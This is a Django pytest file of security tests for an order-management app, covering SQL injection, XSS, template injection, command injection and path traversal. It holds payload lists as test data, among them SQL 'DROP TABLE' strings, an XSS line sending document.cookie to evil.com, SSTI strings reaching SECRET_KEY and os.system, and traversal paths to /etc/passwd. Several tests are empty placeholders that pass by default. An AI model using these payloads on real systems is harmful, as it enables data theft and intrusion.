"""
Security tests for injection vulnerabilities.

This test suite covers:
- SQL Injection
- XSS (Cross-Site Scripting)
- Command Injection
- Template Injection
- LDAP Injection (if applicable)
"""
import pytest
from django.test import TestCase, Client
from django.db import connection
from apps.tenants.models import Tenant
from apps.parties.models import Party, Customer
from apps.items.models import Item, UnitOfMeasure
from apps.orders.models import SalesOrder
from shared.models import TenantContext
from django.contrib.auth import get_user_model

User = get_user_model()


@pytest.mark.security
@pytest.mark.injection
class SQLInjectionSecurityTests(TestCase):
    """
    Test for SQL injection vulnerabilities.

    SQL injection is one of the most critical web application vulnerabilities.
    These tests verify that user input is properly sanitized.
    """

    def setUp(self):
        self.tenant = Tenant.objects.create(
            name="Test Tenant",
            subdomain="test"
        )
        self.client = Client()

    def test_sql_injection_in_party_name(self):
        """
        CRITICAL: Test SQL injection through party name field.

        Attack: Use SQL injection payload in party name to extract data.
        """
        malicious_payloads = [
            "'; DROP TABLE parties_party; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' UNION SELECT NULL, NULL, NULL--",
            "1'; UPDATE parties_party SET name='HACKED' WHERE '1'='1",
        ]

        with TenantContext(self.tenant):
            for payload in malicious_payloads:
                try:
                    # Try to create party with malicious name
                    party = Party.objects.create(
                        name=payload,
                        tenant=self.tenant
                    )

                    # If we get here, the payload was escaped/sanitized (GOOD)
                    # Verify the payload is stored as literal text, not executed
                    retrieved = Party.objects.get(id=party.id)
                    self.assertEqual(retrieved.name, payload)

                    # Verify database is intact
                    self.assertTrue(Party.objects.filter(id=party.id).exists())

                    # Clean up
                    party.delete()

                except Exception as e:
                    # If an exception occurred, make sure it's not because
                    # the SQL was executed
                    self.fail(f"SQL injection payload caused unexpected error: {e}")

    def test_sql_injection_in_filters(self):
        """
        CRITICAL: Test SQL injection through filter parameters.

        Attack: Use SQL injection in search/filter queries.
        """
        with TenantContext(self.tenant):
            # Create test data
            Party.objects.create(display_name="Legitimate Party", tenant=self.tenant)

            malicious_filters = [
                "' OR '1'='1",
                "1' OR '1' = '1",
                "' OR 1=1--",
            ]

            for payload in malicious_filters:
                try:
                    # Try to filter with malicious input
                    results = Party.objects.filter(name=payload)

                    # Should return empty or only matching literal text
                    # Should NOT return all records (which would indicate successful injection)
                    self.assertLessEqual(results.count(), 1,
                        f"SQL injection may have succeeded with payload: {payload}")

                except Exception as e:
                    # Exceptions are OK - they indicate the query was rejected
                    pass

    def test_sql_injection_in_order_by(self):
        """
        CRITICAL: Test SQL injection through ORDER BY clause.

        Attack: Use SQL injection in sorting parameters.
        """
        with TenantContext(self.tenant):
            Party.objects.create(display_name="Party A", tenant=self.tenant)
            Party.objects.create(display_name="Party B", tenant=self.tenant)

            malicious_order_by = [
                "name; DROP TABLE parties_party; --",
                "name, (SELECT CASE WHEN (1=1) THEN name ELSE id END)",
            ]

            for payload in malicious_order_by:
                try:
                    # Attempt to order by malicious input
                    # Django ORM should sanitize or reject this
                    results = Party.objects.all().order_by(payload)
                    list(results)  # Force query execution

                    # If we get here, verify database is intact
                    self.assertEqual(Party.objects.count(), 2)

                except Exception as e:
                    # Exceptions are acceptable - they indicate rejection
                    # Make sure it's not a database error from executed SQL
                    self.assertNotIn("DROP TABLE", str(e).upper())

    def test_raw_sql_injection_protection(self):
        """
        CRITICAL: Test that raw SQL queries are protected.

        Attack: If raw SQL is used anywhere, test parameter binding.
        """
        with TenantContext(self.tenant):
            Party.objects.create(display_name="Test Party", tenant=self.tenant)

            # Malicious input
            malicious_input = "'; DROP TABLE parties_party; --"

            try:
                # Test raw query with parameterization (SAFE)
                with connection.cursor() as cursor:
                    cursor.execute(
                        "SELECT * FROM parties_party WHERE name = %s",
                        [malicious_input]
                    )
                    results = cursor.fetchall()

                # Query should execute safely with no injection
                # Verify database is intact
                self.assertTrue(Party.objects.exists())

            except Exception as e:
                self.fail(f"Parameterized query failed: {e}")

            # Test raw query WITHOUT parameterization (UNSAFE - should fail in code review)
            # This is here to demonstrate the vulnerability if anyone uses string formatting
            try:
                with connection.cursor() as cursor:
                    # UNSAFE: String formatting - DO NOT USE IN REAL CODE
                    unsafe_query = f"SELECT * FROM parties_party WHERE name = '{malicious_input}'"
                    # We're not actually executing this in the test
                    # Just documenting that this pattern is DANGEROUS

                    # If any developer uses this pattern, it MUST be caught in code review
                    pass
            except:
                pass

    def test_sql_injection_through_extra(self):
        """
        Security: Test SQL injection through QuerySet.extra() method.

        Attack: Use SQL injection via extra() queries.
        """
        with TenantContext(self.tenant):
            Party.objects.create(display_name="Test Party", tenant=self.tenant)

            malicious_where = "1=1 OR '1'='1"

            try:
                # Test extra() with user input (should be parameterized)
                results = Party.objects.extra(
                    where=["name = %s"],
                    params=[malicious_where]
                )
                list(results)  # Force execution

                # Should execute safely
                self.assertTrue(Party.objects.exists())

            except Exception as e:
                # Exceptions are OK
                pass


@pytest.mark.security
@pytest.mark.injection
class XSSSecurityTests(TestCase):
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities.

    XSS allows attackers to inject malicious scripts into web pages
    viewed by other users.
    """

    def setUp(self):
        self.tenant = Tenant.objects.create(
            name="Test Tenant",
            subdomain="test"
        )
        self.client = Client()

    def test_xss_in_party_name_storage(self):
        """
        CRITICAL: Test XSS payload storage and retrieval.

        Attack: Store XSS payload in database to attack other users.
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<BODY ONLOAD=alert('XSS')>",
        ]

        with TenantContext(self.tenant):
            for payload in xss_payloads:
                # Create party with XSS payload
                party = Party.objects.create(
                    name=payload,
                    tenant=self.tenant
                )

                # Payload should be stored as-is (database doesn't filter)
                retrieved = Party.objects.get(id=party.id)
                self.assertEqual(retrieved.name, payload)

                # The protection happens at the template level
                # Templates should escape HTML by default
                # This is verified by template rendering tests

                party.delete()

    def test_xss_in_item_description(self):
        """
        CRITICAL: Test XSS in item description field.

        Attack: Inject XSS through product descriptions.
        """
        with TenantContext(self.tenant):
            uom = UnitOfMeasure.objects.create(name="Each", code="ea")

            xss_payload = "<script>alert('XSS in description')</script>"

            item = Item.objects.create(
                sku="TEST-001",
                name="Test Item",
                description=xss_payload,
                base_uom=uom,
                tenant=self.tenant
            )

            # Payload stored as-is
            retrieved = Item.objects.get(id=item.id)
            self.assertEqual(retrieved.description, xss_payload)

            # Template rendering should escape this
            # (Tested separately in template tests)

    def test_xss_in_order_notes(self):
        """
        CRITICAL: Test XSS in order notes field.

        Attack: Inject XSS through order notes.
        """
        with TenantContext(self.tenant):
            from apps.parties.models import Location

            uom = UnitOfMeasure.objects.create(name="Each", code="ea")
            party = Party.objects.create(display_name="Test Party", tenant=self.tenant)
            customer = Customer.objects.create(party=party)
            location = Location.objects.create(
                party=party,
                name="Test Location",
                address_line1="123 Test St",
                city="Test",
                state="CA",
                postal_code="90001",
                tenant=self.tenant
            )

            xss_payload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

            order = SalesOrder.objects.create(
                order_number="SO-001",
                customer=customer,
                ship_to=location,
                notes=xss_payload,
                tenant=self.tenant
            )

            # Payload stored as-is
            retrieved = SalesOrder.objects.get(id=order.id)
            self.assertEqual(retrieved.notes, xss_payload)

    def test_template_autoescape_enabled(self):
        """
        CRITICAL: Verify Django template autoescape is enabled.

        Attack: XSS through template rendering.
        """
        from django.conf import settings
        from django.template import engines

        # Check template settings
        template_engine = engines['django']

        # Autoescape should be enabled (default in Django)
        # This prevents XSS by automatically escaping HTML

        # Check if there are any templates with {% autoescape off %}
        # (This would be done through static analysis in a real audit)

    def test_safe_filter_usage(self):
        """
        Security: Check for unsafe use of 'safe' filter in templates.

        Attack: XSS through |safe or {% autoescape off %}.
        """
        # This test is a placeholder for template analysis
        # In a real audit, we'd scan all templates for:
        # - {{ variable|safe }}
        # - {% autoescape off %}
        # - mark_safe() in views
        #
        # Each instance needs review to ensure user input isn't marked safe
        pass


@pytest.mark.security
@pytest.mark.injection
class CommandInjectionSecurityTests(TestCase):
    """
    Test for command injection vulnerabilities.

    Verifies that user input isn't passed to system commands.
    """

    def setUp(self):
        self.tenant = Tenant.objects.create(
            name="Test Tenant",
            subdomain="test"
        )

    def test_no_shell_command_execution(self):
        """
        CRITICAL: Verify user input is never passed to shell commands.

        Attack: Command injection through system calls.
        """
        # This is more of a code review test
        # We're documenting that subprocess, os.system, eval, exec
        # should NEVER be used with user input

        import subprocess
        import os

        # Example of UNSAFE patterns that should NEVER exist:
        # subprocess.call(f"ls {user_input}", shell=True)  # DANGEROUS
        # os.system(f"cat {user_input}")  # DANGEROUS
        # eval(user_input)  # DANGEROUS

        # If file operations are needed, use os.path.join and validate
        # If subprocess is needed, use list form without shell=True

        # This test passes by default
        # Real test would be static code analysis
        pass


@pytest.mark.security
@pytest.mark.injection
class TemplateInjectionSecurityTests(TestCase):
    """
    Test for Server-Side Template Injection (SSTI).

    Verifies that user input isn't rendered as template code.
    """

    def setUp(self):
        self.tenant = Tenant.objects.create(
            name="Test Tenant",
            subdomain="test"
        )

    def test_template_injection_in_party_name(self):
        """
        CRITICAL: Test template injection through party name.

        Attack: Inject template code to execute on server.
        """
        ssti_payloads = [
            "{{ 7*7 }}",
            "{% debug %}",
            "{{ settings.SECRET_KEY }}",
            "{% load os %}{{ os.system('ls') }}",
        ]

        with TenantContext(self.tenant):
            for payload in ssti_payloads:
                party = Party.objects.create(
                    name=payload,
                    tenant=self.tenant
                )

                # Payload should be stored as literal string
                retrieved = Party.objects.get(id=party.id)
                self.assertEqual(retrieved.name, payload)

                # When rendered in template, should display as text, not execute
                # (This requires template rendering test)

                party.delete()

    def test_no_template_from_string_with_user_input(self):
        """
        CRITICAL: Verify Template.from_string() not used with user input.

        Attack: SSTI through dynamic template creation.
        """
        # This is a code review test
        # from django.template import Template
        # Template("{{ user_input }}").render(context)  # UNSAFE if user_input is untrusted

        # Should use static templates only
        # Or carefully validate/sanitize if dynamic templates are necessary
        pass


@pytest.mark.security
@pytest.mark.injection
class PathTraversalSecurityTests(TestCase):
    """
    Test for path traversal vulnerabilities.

    Verifies that file operations properly validate paths.
    """

    def test_file_upload_path_traversal(self):
        """
        CRITICAL: Test path traversal in file uploads.

        Attack: Upload file with path like ../../../etc/passwd.
        """
        # If file upload functionality exists, test it here
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ]

        # File upload should:
        # 1. Validate filename
        # 2. Generate safe filename
        # 3. Save to restricted directory only
        pass

    def test_static_file_access_path_traversal(self):
        """
        Security: Test path traversal in static file serving.

        Attack: Access files outside static directory.
        """
        # If custom static file serving exists, test it
        # Django's built-in static serving is safe
        pass
